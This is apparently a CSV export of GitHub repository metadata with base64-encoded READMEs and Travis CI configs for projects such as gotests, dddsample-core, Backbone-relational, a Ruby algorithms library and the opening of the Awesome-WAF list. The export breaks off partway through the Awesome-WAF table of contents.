name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
aWVzIGluIHRoZSB0ZXN0IGZpbGVzIGFyZSBhdXRvbWF0aWNhbGx5IGltcG9y
dGVkLgoKIyMgRGVtbwoKVGhlIGZvbGxvd2luZyBzaG93cyBgZ290ZXN0c2Ag
aW4gYWN0aW9uIHVzaW5nIHRoZSBbb2ZmaWNpYWwgU3VibGltZSBUZXh0IDMg
cGx1Z2luXShodHRwczovL2dpdGh1Yi5jb20vY3dlaWxsL0dvVGVzdHMtU3Vi
bGltZSkuIFBsdWdpbnMgYWxzbyBleGlzdCBmb3IgW0VtYWNzXShodHRwczov
L2dpdGh1Yi5jb20vZGFtaWVubGV2aW4vR29UZXN0cy1FbWFjcyksIGFsc28g
W0VtYWNzXShodHRwczovL2dpdGh1Yi5jb20vcy1rb3N0eWFldi9nby1nZW4t
dGVzdCksIFtWaW1dKGh0dHBzOi8vZ2l0aHViLmNvbS9idW90by9nb3Rlc3Rz
LXZpbSksIFtBdG9tIEVkaXRvcl0oaHR0cHM6Ly9hdG9tLmlvL3BhY2thZ2Vz
L2dvdGVzdHMpLCBbVmlzdWFsIFN0dWRpbyBDb2RlXShodHRwczovL2dpdGh1
Yi5jb20vTWljcm9zb2Z0L3ZzY29kZS1nbyksIGFuZCBbSW50ZWxsaUogR29s
YW5kXShodHRwczovL3d3dy5qZXRicmFpbnMuY29tL2hlbHAvZ28vcnVuLWRl
YnVnLWNvbmZpZ3VyYXRpb24tZm9yLWdvLXRlc3QuaHRtbCkuCgohW2RlbW9d
KGh0dHBzOi8vZ2l0aHViLmNvbS9jd2VpbGwvR29UZXN0cy1TdWJsaW1lL2Js
b2IvbWFzdGVyL2dvdGVzdHMuZ2lmKQoKIyMgSW5zdGFsbGF0aW9uCgpfX01p
bmltdW0gR28gdmVyc2lvbjpfXyBHbyAxLjYKClVzZSBbYGdvIGdldGBdKGh0
dHBzOi8vZ29sYW5nLm9yZy9jbWQvZ28vI2hkci1Eb3dubG9hZF9hbmRfaW5z
dGFsbF9wYWNrYWdlc19hbmRfZGVwZW5kZW5jaWVzKSB0byBpbnN0YWxsIGFu
ZCB1cGRhdGU6CgpgYGBzaAokIGdvIGdldCAtdSBnaXRodWIuY29tL2N3ZWls
bC9nb3Rlc3RzLy4uLgpgYGAKCiMjIFVzYWdlCgpGcm9tIHRoZSBjb21tYW5k
bGluZSwgYGdvdGVzdHNgIGNhbiBnZW5lcmF0ZSBHbyB0ZXN0cyBmb3Igc3Bl
Y2lmaWMgc291cmNlIGZpbGVzIG9yIGFuIGVudGlyZSBkaXJlY3RvcnkuIEJ5
IGRlZmF1bHQsIGl0IHByaW50cyBpdHMgb3V0cHV0IHRvIGBzdGRvdXRgLgoK
YGBgc2gKJCBnb3Rlc3RzIFtvcHRpb25zXSBQQVRIIC4uLgpgYGAKCkF2YWls
YWJsZSBvcHRpb25zOgoKYGBgCiAgLWFsbCAgICAgICAgICAgICAgICAgIGdl
bmVyYXRlIHRlc3RzIGZvciBhbGwgZnVuY3Rpb25zIGFuZCBtZXRob2RzCgog
IC1leGNsICAgICAgICAgICAgICAgICByZWdleHAuIGdlbmVyYXRlIHRlc3Rz
IGZvciBmdW5jdGlvbnMgYW5kIG1ldGhvZHMgdGhhdCBkb24ndAogICAgICAg
ICAgICAgICAgICAgICAgICAgbWF0Y2guIFRha2VzIHByZWNlZGVuY2Ugb3Zl
ciAtb25seSwgLWV4cG9ydGVkLCBhbmQgLWFsbAoKICAtZXhwb3J0ZWQgICAg
ICAgICAgICAgZ2VuZXJhdGUgdGVzdHMgZm9yIGV4cG9ydGVkIGZ1bmN0aW9u
cyBhbmQgbWV0aG9kcy4gVGFrZXMKICAgICAgICAgICAgICAgICAgICAgICAg
IHByZWNlZGVuY2Ugb3ZlciAtb25seSBhbmQgLWFsbAoKICAtaSAgICAgICAg
ICAgICAgICAgICAgcHJpbnQgdGVzdCBpbnB1dHMgaW4gZXJyb3IgbWVzc2Fn
ZXMKCiAgLW9ubHkgICAgICAgICAgICAgICAgIHJlZ2V4cC4gZ2VuZXJhdGUg
dGVzdHMgZm9yIGZ1bmN0aW9ucyBhbmQgbWV0aG9kcyB0aGF0IG1hdGNoIG9u
bHkuCiAgICAgICAgICAgICAgICAgICAgICAgICBUYWtlcyBwcmVjZWRlbmNl
IG92ZXIgLWFsbAoKICAtbm9zdWJ0ZXN0cyAgICAgICAgICAgZGlzYWJsZSBz
dWJ0ZXN0IGdlbmVyYXRpb24gd2hlbiA+PSBHbyAxLjcKCiAgLXcgICAgICAg
ICAgICAgICAgICAgIHdyaXRlIG91dHB1dCB0byAodGVzdCkgZmlsZXMgaW5z
dGVhZCBvZiBzdGRvdXQKCiAgLXRlbXBsYXRlX2RpciAgICAgICAgIFBhdGgg
dG8gYSBkaXJlY3RvcnkgY29udGFpbmluZyBjdXN0b20gdGVzdCBjb2RlIHRl
bXBsYXRlcy4gVGFrZXMKICAgICAgICAgICAgICAgICAgICAgICAgIHByZWNl
ZGVuY2Ugb3ZlciAtdGVtcGxhdGUKCiAgLXRlbXBsYXRlICAgICAgICAgICAg
IFNwZWNpZnkgY3VzdG9tIHRlc3QgY29kZSB0ZW1wbGF0ZXMsIGUuZy4gdGVz
dGlmeQoKICAtdGVtcGxhdGVfcGFyYW1zX2ZpbGUgcmVhZCBleHRlcm5hbCBw
YXJhbWV0ZXJzIHRvIHRlbXBsYXRlIGJ5IGpzb24gd2l0aCBmaWxlCgogIC10
ZW1wbGF0ZV9wYXJhbXMgICAgICByZWFkIGV4dGVybmFsIHBhcmFtZXRlcnMg
dG8gdGVtcGxhdGUgYnkganNvbiB3aXRoIHN0ZGluCmBgYAoKIyMgQ29udHJp
YnV0aW9ucwoKQ29udHJpYnV0aW5nIGd1aWRlbGluZXMgYXJlIGluIFtDT05U
UklCVVRJTkcubWRdKENPTlRSSUJVVElORy5tZCkuCgojIyBMaWNlbnNlCgpg
Z290ZXN0c2AgaXMgcmVsZWFzZWQgdW5kZXIgdGhlIFtBcGFjaGUgMi4wIExp
Y2Vuc2VdKGh0dHA6Ly93d3cuYXBhY2hlLm9yZy9saWNlbnNlcy9MSUNFTlNF
LTIuMCkuCg==
",,"c3VkbzogcmVxdWlyZWQKbGFuZ3VhZ2U6IGdvCmdvOgogIC0gMS45LngKICAt
IDEuMTAueAogIC0gMS4xMS54CiAgLSAxLjEyLngKYmVmb3JlX2luc3RhbGw6
CiAgLSBnbyBnZXQgZ2l0aHViLmNvbS9tYXR0bi9nb3ZlcmFsbHMKICAtIGlm
ICEgZ28gZ2V0IGdpdGh1Yi5jb20vZ29sYW5nL3Rvb2xzL2NtZC9jb3Zlcjsg
dGhlbiBnbyBnZXQgZ29sYW5nLm9yZy94L3Rvb2xzL2NtZC9jb3ZlcjsgZmkK
c2NyaXB0OgogIC0gZ28gdGVzdCAuLy4uLgogIC0gZ28gdGVzdCAtYyAtY292
ZXJtb2RlPWNvdW50IC1jb3ZlcnBrZz1naXRodWIuY29tL2N3ZWlsbC9nb3Rl
c3RzLGdpdGh1Yi5jb20vY3dlaWxsL2dvdGVzdHMvaW50ZXJuYWwvaW5wdXQs
Z2l0aHViLmNvbS9jd2VpbGwvZ290ZXN0cy9pbnRlcm5hbC9yZW5kZXIsZ2l0
aHViLmNvbS9jd2VpbGwvZ290ZXN0cy9pbnRlcm5hbC9nb3BhcnNlcixnaXRo
dWIuY29tL2N3ZWlsbC9nb3Rlc3RzL2ludGVybmFsL291dHB1dCxnaXRodWIu
Y29tL2N3ZWlsbC9nb3Rlc3RzL2ludGVybmFsL21vZGVscwogIC0gLi9nb3Rl
c3RzLnRlc3QgLXRlc3QuY292ZXJwcm9maWxlIGNvdmVyYWdlLmNvdgogIC0g
JEhPTUUvZ29wYXRoL2Jpbi9nb3ZlcmFsbHMgLXNlcnZpY2U9dHJhdmlzLWNp
IC1jb3ZlcnByb2ZpbGU9Y292ZXJhZ2UuY292Cg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'dddsample-core',30129939,b'This is the new home of the original DDD Sample app (previously hosted at sf.net).. ',b'Java',8,2383,,2383,False,b'https://api.github.com/repos/citerus/dddsample-core/forks',"IyBERERTYW1wbGUKVGhpcyBpcyB0aGUgbmV3IGhvbWUgb2YgdGhlIG9yaWdp
bmFsIERERCBTYW1wbGUgYXBwIGhvc3RlZCBhdCBTb3VyY2VGb3JnZS4gCgpP
dXIgaW50ZW50aW9uIGlzIHRvIG1vdmUgZXZlcnl0aGluZyBmcm9tIFNvdXJj
ZUZvcmdlIHRvIEdpdEh1YiBpbiBkdWUgdGltZSB3aGlsZSBzdGFydGluZyB1
cGdyYWRpbmcgYm90aCB0aGUgdGVjaG5pY2FsIGFzcGVjdHMgYXMgd2VsbCBh
cyB0aGUgREREIGFzcGVjdHMgb2YgdGhlIERERCBTYW1wbGUuCgpUaGUgYXBw
bGljYXRpb24gdXNlcyBTcHJpbmcgQm9vdC4gVG8gc3RhcnQgaXQgZ28gdG8g
dGhlIHJvb3QgZGlyZWN0b3J5IGFuZCB0eXBlIGBtdm4gc3ByaW5nLWJvb3Q6
cnVuYCBvciBydW4gdGhlIGBtYWluYCBtZXRob2Qgb2YgdGhlIGBBcHBsaWNh
dGlvbmAgY2xhc3MgZnJvbSB5b3VyIElERS4gIApUaGVuIG9wZW4gaHR0cDov
L2xvY2FsaG9zdDo4MDgwL2RkZHNhbXBsZSBpbiB5b3VyIGJyb3dzZXIgKGFu
ZCBtYWtlIHN1cmUsIHRoYXQgbm8gZmlyZXdhbGwgaXMgYmxvY2tpbmcgdGhl
IGNvbW11bmljYXRpb24pLgoKRGlzY3Vzc2lvbiBncm91cDogaHR0cHM6Ly9n
cm91cHMuZ29vZ2xlLmNvbS9mb3J1bS8jIWZvcnVtL2RkZHNhbXBsZQoKRGV2
ZWxvcG1lbnQgYmxvZzogaHR0cHM6Ly9jaXRlcnVzLmdpdGh1Yi5pby9kZGRz
YW1wbGUtY29yZS8KClRyZWxsbyBib2FyZDogaHR0cHM6Ly90cmVsbG8uY29t
L2IvUFRERlJ5eGQKClshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly90cmF2aXMt
Y2kub3JnL2NpdGVydXMvZGRkc2FtcGxlLWNvcmUuc3ZnP2JyYW5jaD1tYXN0
ZXIpXShodHRwczovL3RyYXZpcy1jaS5vcmcvY2l0ZXJ1cy9kZGRzYW1wbGUt
Y29yZSkK
",,"bGFuZ3VhZ2U6IGphdmEKamRrOgogIC0gb3JhY2xlamRrOA==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Backbone-relational',1598886,"b'Get and set relations (one-to-one, one-to-many, many-to-one) for Backbone models'",b'JavaScript',70,2382,,2382,False,b'https://api.github.com/repos/PaulUithol/Backbone-relational/forks',"IyBCYWNrYm9uZS1yZWxhdGlvbmFsCgpCYWNrYm9uZS1yZWxhdGlvbmFsIHBy
b3ZpZGVzIG9uZS10by1vbmUsIG9uZS10by1tYW55IGFuZCBtYW55LXRvLW9u
ZSByZWxhdGlvbnMgYmV0d2VlbiBtb2RlbHMgZm9yIFtCYWNrYm9uZV0oaHR0
cHM6Ly9naXRodWIuY29tL2RvY3VtZW50Y2xvdWQvYmFja2JvbmUpLgoKRG9j
dW1lbnRhdGlvbjogaHR0cDovL2JhY2tib25lcmVsYXRpb25hbC5vcmcKCkJh
Y2tib25lLXJlbGF0aW9uYWwgaXMgcmVsZWFzZWQgdW5kZXIgdGhlIFtNSVQg
bGljZW5zZV0oaHR0cHM6Ly9naXRodWIuY29tL1BhdWxVaXRob2wvQmFja2Jv
bmUtcmVsYXRpb25hbC9ibG9iL21hc3Rlci9MSUNFTlNFLnR4dCkuCkNvbnRy
aWJ1dG9yczogaHR0cHM6Ly9naXRodWIuY29tL1BhdWxVaXRob2wvQmFja2Jv
bmUtcmVsYXRpb25hbC9jb250cmlidXRvcnMK
",,"bGFuZ3VhZ2U6IG5vZGVfanMKbm9kZV9qczoKICAtICI4IgpiZWZvcmVfaW5z
dGFsbDoKICAtIG5wbSBpbnN0YWxsIC1nIG5wbQogIC0gbnBtIGluc3RhbGwg
LWcga2FybWEtY2xpQDEKc2NyaXB0OgogIC0gbnBtIHRlc3QKICAtIGthcm1h
IHN0YXJ0IC0tc2luZ2xlLXJ1biAtLWJyb3dzZXJzIFBoYW50b21KUyAtLWxv
ZGFzaApzdWRvOiBmYWxzZQpjYWNoZToKICBkaXJlY3RvcmllczoKICAgIC0g
bm9kZV9tb2R1bGVzCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'algorithms',32958,b'Ruby algorithms and data structures. C extensions',b'Ruby',20,2382,,2382,False,b'https://api.github.com/repos/kanwei/algorithms/forks',"IyBhbGdvcml0aG1zIFshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly90cmF2aXMt
Y2kub3JnL2thbndlaS9hbGdvcml0aG1zLnBuZyldKGh0dHBzOi8vdHJhdmlz
LWNpLm9yZy9rYW53ZWkvYWxnb3JpdGhtcykKCltBUEkgRG9jdW1lbnRhdGlv
bl0oaHR0cDovL2thbndlaS5naXRodWIuaW8vYWxnb3JpdGhtcy8pCgojIyBE
RVNDUklQVElPTjoKClN0YXJ0ZWQgYXMgYSBbR29vZ2xlIFN1bW1lciBvZiBD
b2RlIDIwMDhdKGh0dHA6Ly9jb2RlLmdvb2dsZS5jb20vc29jLzIwMDgvcnVi
eS9hYm91dC5odG1sKSBwcm9qZWN0CgpXcml0dGVuIGJ5IFtLYW53ZWkgTGld
KGh0dHA6Ly9rYW53ZWkuY29tLyksIG1lbnRvcmVkIGJ5IEF1c3RpbiBaaWVn
bGVyCgojIyMgT3JpZ2luYWwgUHJvcG9zYWw6ICMjIwoKVXNpbmcgdGhlIHJp
Z2h0IGRhdGEgc3RydWN0dXJlIG9yIGFsZ29yaXRobSBmb3IgdGhlIHNpdHVh
dGlvbiBpcyBhbiBpbXBvcnRhbnQKYXNwZWN0IG9mIHByb2dyYW1taW5nLiBJ
biBjb21wdXRlciBzY2llbmNlIGxpdGVyYXR1cmUsIG1hbnkgZGF0YSBzdHJ1
Y3R1cmVzCmFuZCBhbGdvcml0aG1zIGhhdmUgYmVlbiByZXNlYXJjaGVkIGFu
ZCBleHRlbnNpdmVseSBkb2N1bWVudGVkLiBIb3dldmVyLCB0aGVyZQppcyBz
dGlsbCBubyBzdGFuZGFyZCBsaWJyYXJ5IGluIFJ1YnkgaW1wbGVtZW50aW5n
IHVzZWZ1bCBzdHJ1Y3R1cmVzIGFuZAphbGdvcml0aG1zIGxpa2UgUmVkL0Js
YWNrIFRyZWVzLCB0cmllcywgZGlmZmVyZW50IHNvcnRpbmcgYWxnb3JpdGht
cywgZXRjLgpUaGlzIHByb2plY3Qgd2lsbCBjcmVhdGUgc3VjaCBhIGxpYnJh
cnkgd2l0aCBkb2N1bWVudGF0aW9uIG9uIHdoZW4gdG8gdXNlIGEKcGFydGlj
dWxhciBzdHJ1Y3R1cmUvYWxnb3JpdGhtLiBJdCB3aWxsIGFsc28gY29tZSB3
aXRoIGEgYmVuY2htYXJrIHN1aXRlIHRvCmNvbXBhcmUgcGVyZm9ybWFuY2Ug
aW4gZGlmZmVyZW50IHNpdHVhdGlvbnMuCgojIyBDT01QTEVURUQ6CgogICAg
KiBIZWFwcyAgICAgICAgICAgICAgQ29udGFpbmVyczo6SGVhcCwgQ29udGFp
bmVyczo6TWF4SGVhcCwgQ29udGFpbmVyczo6TWluSGVhcAogICAgKiBQcmlv
cml0eSBRdWV1ZSAgICAgQ29udGFpbmVyczo6UHJpb3JpdHlRdWV1ZQogICAg
KiBEZXF1ZSAgICAgICAgICAgICAgQ29udGFpbmVyczo6RGVxdWUsIENvbnRh
aW5lcnM6OkNEZXF1ZSAoQyBleHQpCiAgICAqIFN0YWNrICAgICAgICAgICAg
ICBDb250YWluZXJzOjpTdGFjawogICAgKiBRdWV1ZSAgICAgICAgICAgICAg
Q29udGFpbmVyczo6UXVldWUKICAgICogUmVkLUJsYWNrIFRyZWVzICAgIENv
bnRhaW5lcnM6OlJCVHJlZU1hcCwgQ29udGFpbmVyczo6Q1JCVHJlZU1hcCAo
QyBleHQpCiAgICAqIFNwbGF5IFRyZWVzICAgICAgICBDb250YWluZXJzOjpT
cGxheVRyZWVNYXAsIENvbnRhaW5lcnM6OkNTcGxheVRyZWVNYXAgKEMgZXh0
KQogICAgKiBUcmllcyAgICAgICAgICAgICAgQ29udGFpbmVyczo6VHJpZQog
ICAgKiBTdWZmaXggQXJyYXkgICAgICAgQ29udGFpbmVyczo6U3VmZml4QXJy
YXkKCiAgICAqIFNlYXJjaCBhbGdvcml0aG1zCiAgICAgIC0gQmluYXJ5IFNl
YXJjaCAgICAgICAgICAgIEFsZ29yaXRobXM6OlNlYXJjaC5iaW5hcnlfc2Vh
cmNoCiAgICAgIC0gS251dGgtTW9ycmlzLVByYXR0ICAgICAgIEFsZ29yaXRo
bXM6OlNlYXJjaC5rbXBfc2VhcmNoCiAgICAqIFNvcnRpbmcgYWxnb3JpdGht
cyAgICAgICAgICAgCiAgICAgIC0gQnViYmxlIHNvcnQgICAgICAgICAgICAg
IEFsZ29yaXRobXM6OlNvcnQuYnViYmxlX3NvcnQKICAgICAgLSBDb21iIHNv
cnQgICAgICAgICAgICAgICAgQWxnb3JpdGhtczo6U29ydC5jb21iX3NvcnQK
ICAgICAgLSBTZWxlY3Rpb24gc29ydCAgICAgICAgICAgQWxnb3JpdGhtczo6
U29ydC5zZWxlY3Rpb25fc29ydAogICAgICAtIEhlYXBzb3J0ICAgICAgICAg
ICAgICAgICBBbGdvcml0aG1zOjpTb3J0LmhlYXBzb3J0CiAgICAgIC0gSW5z
ZXJ0aW9uIHNvcnQgICAgICAgICAgIEFsZ29yaXRobXM6OlNvcnQuaW5zZXJ0
aW9uX3NvcnQKICAgICAgLSBTaGVsbCBzb3J0ICAgICAgICAgICAgICAgQWxn
b3JpdGhtczo6U29ydC5zaGVsbF9zb3J0CiAgICAgIC0gUXVpY2tzb3J0ICAg
ICAgICAgICAgICAgIEFsZ29yaXRobXM6OlNvcnQucXVpY2tzb3J0CiAgICAg
IC0gTWVyZ2Vzb3J0ICAgICAgICAgICAgICAgIEFsZ29yaXRobXM6OlNvcnQu
bWVyZ2Vzb3J0CiAgICAgIC0gRHVhbC1QaXZvdCBRdWlja3NvcnQgICAgIEFs
Z29yaXRobXM6OlNvcnQuZHVhbHBpdm90cXVpY2tzb3J0CgojIyBTWU5PUFNJ
UzoKCiAgICByZXF1aXJlICdydWJ5Z2VtcycKICAgIHJlcXVpcmUgJ2FsZ29y
aXRobXMnCgogICAgbWF4X2hlYXAgPSBDb250YWluZXJzOjpNYXhIZWFwLm5l
dwoKICAgICMgVG8gbm90IGhhdmUgdG8gdHlwZSAiQ29udGFpbmVyczo6IiBi
ZWZvcmUgZWFjaCBjbGFzcywgdXNlOgogICAgaW5jbHVkZSBDb250YWluZXJz
CiAgICBtYXhfaGVhcCA9IE1heEhlYXAubmV3CgojIyBSRVFVSVJFTUVOVFM6
CgoqIFJ1YnkgMS44LCBSdWJ5IDEuOSwgSlJ1YnkKKiBDIGV4dGVuc2lvbnMg
KG9wdGlvbmFsLCBidXQgdmVyeSBtdWNoIHJlY29tbWVuZGVkIGZvciB2YXN0
IHBlcmZvcm1hbmNlIGJlbmVmaXRzKQoKIyMgTElDRU5TRToKClNlZSBbTElD
RU5TRS5tZF0oTElDRU5TRS5tZCkuCg==
",,"bGFuZ3VhZ2U6IHJ1YnkKcnZtOgogIC0gMi4yCiAgLSAyLjEKICAtIDIuMAog
IC0gMS45CiAgCmJlZm9yZV9pbnN0YWxsOgogIC0gZ2VtIHVwZGF0ZSAtLXN5
c3RlbQogIC0gZ2VtIHVwZGF0ZSBidW5kbGVyCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Awesome-WAF',164564630,b'\xf0\x9f\x94\xa5 Everything awesome about web-application firewalls (WAF).',b'Python',0,2382,,2382,False,b'https://api.github.com/repos/0xInfection/Awesome-WAF/forks',"IyBBd2Vzb21lIFdBRiBbIVtBd2Vzb21lXShodHRwczovL2Nkbi5yYXdnaXQu
Y29tL3NpbmRyZXNvcmh1cy9hd2Vzb21lL2Q3MzA1ZjM4ZDI5ZmVkNzhmYTg1
NjUyZTNhNjNlMTU0ZGQ4ZTg4MjkvbWVkaWEvYmFkZ2Uuc3ZnICJBd2Vzb21l
IildKGh0dHBzOi8vZ2l0aHViLmNvbS8weGluZmVjdGlvbi9hd2Vzb21lLXdh
ZikKPiBFdmVyeXRoaW5nIGF3ZXNvbWUgYWJvdXQgd2ViIGFwcGxpY2F0aW9u
IGZpcmV3YWxscyAoV0FGcykuIPCflKUKPgo+IF9fRm9yZXdvcmQ6X18gVGhp
cyB3YXMgb3JpZ2luYWxseSBteSBvd24gY29sbGVjdGlvbiBvbiBXQUZzLiBJ
IGFtIG9wZW4tc291cmNpbmcgaXQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxs
IGJlIHVzZWZ1bCBmb3IgcGVudGVzdGVycyBhbmQgcmVzZWFyY2hlcnMgb3V0
IHRoZXJlLiBZb3UgbWlnaHQgd2FudCB0byBrZWVwIHRoaXMgcmVwbyBvbiBh
IHdhdGNoLCBzaW5jZSBpdCB3aWxsIGJlIHVwZGF0ZWQgcmVndWxhcmx5LiAi
VGhlIGNvbW11bml0eSBqdXN0IGxlYXJucyBmcm9tIGVhY2ggb3RoZXIuIiBf
XyNTaGFyaW5naXNDYXJpbmdfXwoKIVtNYWluIExvZ29dKGltYWdlcy9ob3ct
d2Fmcy13b3JrLnBuZyAnSG93IHdhZnMgd29yaycpCgpfX0EgQ29uY2lzZSBE
ZWZpbml0aW9uOl9fIEEgd2ViIGFwcGxpY2F0aW9uIGZpcmV3YWxsIGlzIGEg
c2VjdXJpdHkgcG9saWN5IGVuZm9yY2VtZW50IHBvaW50IHBvc2l0aW9uZWQg
YmV0d2VlbiBhIHdlYiBhcHBsaWNhdGlvbiBhbmQgdGhlIGNsaWVudCBlbmRw
b2ludC4gVGhpcyBmdW5jdGlvbmFsaXR5IGNhbiBiZSBpbXBsZW1lbnRlZCBp
biBzb2Z0d2FyZSBvciBoYXJkd2FyZSwgcnVubmluZyBpbiBhbiBhcHBsaWFu
Y2UgZGV2aWNlLCBvciBpbiBhIHR5cGljYWwgc2VydmVyIHJ1bm5pbmcgYSBj
b21tb24gb3BlcmF0aW5nIHN5c3RlbS4gSXQgbWF5IGJlIGEgc3RhbmQtYWxv
bmUgZGV2aWNlIG9yIGludGVncmF0ZWQgaW50byBvdGhlciBuZXR3b3JrIGNv
bXBvbmVudHMuICooU291cmNlOiBbUENJIERTUyBJUyA2LjZdKGh0dHBzOi8v
d3d3LnBjaXNlY3VyaXR5c3RhbmRhcmRzLm9yZy9kb2N1bWVudHMvaW5mb3Jt
YXRpb25fc3VwcGxlbWVudF82LjYucGRmKSkqCgpGZWVsIGZyZWUgdG8gW2Nv
bnRyaWJ1dGVdKENPTlRSSUJVVElORy5tZCkuCgojIyMgQ29udGVudHM6Ci0g
W0ludHJvZHVjdGlvbl0oI2ludHJvZHVjdGlvbikKICAgIC0gW0hvdyBXQUZz
IFdvcmtdKCNob3ctd2Fmcy13b3JrKQogICAgLSBbT3BlcmF0aW9uIE1vZGVz
XSgjb3BlcmF0aW9uLW1vZGVzKQotIFtUZXN0aW5nIE1ldGhvZG9sb2d5XSgj
dGVzdGluZy1tZXRob2RvbG9neSkKICAgIC0gW1doZXJlIFRvIExvb2tdKCN3
aGVyZS10by1sb29rKQogICAgLSBbRGV0ZWN0aW9uIFRlY2huaXF1ZXNdKCNk
ZXRlY3Rpb24tdGVjaG5pcXVlcykKLSBbV0FGIEZpbmdlcnByaW50c10oI3dh
Zi1maW5nZXJwcmludHMpCi0gW0V2YXNpb24gVGVjaG5pcXVlc10oI2V2YXNp
b24tdGVjaG5pcXVlcykKICAgIC0gW0Z1enppbmcvQnJ1dGVmb3JjaW5nXSgj
ZnV6emluZ2JydXRlZm9yY2luZykKICAgIC0gW1JlZ2V4IFJldmVyc2luZ10o
I3JlZ2V4LXJldmVyc2luZykKICAgIC0gW09iZnVzY2F0aW9uL0VuY29kaW5n
